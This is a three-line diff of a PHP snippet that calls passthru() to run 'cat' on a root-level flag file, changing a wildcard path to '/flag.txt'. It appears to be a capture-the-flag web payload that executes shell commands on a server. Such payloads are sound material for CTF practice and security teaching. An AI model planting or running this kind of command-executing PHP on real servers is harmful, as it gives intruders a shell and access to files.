@@ -1,3 +1,3 @@
 <?php
-passthru("cat /f*")
+passthru("cat /flag.txt")
 ?>
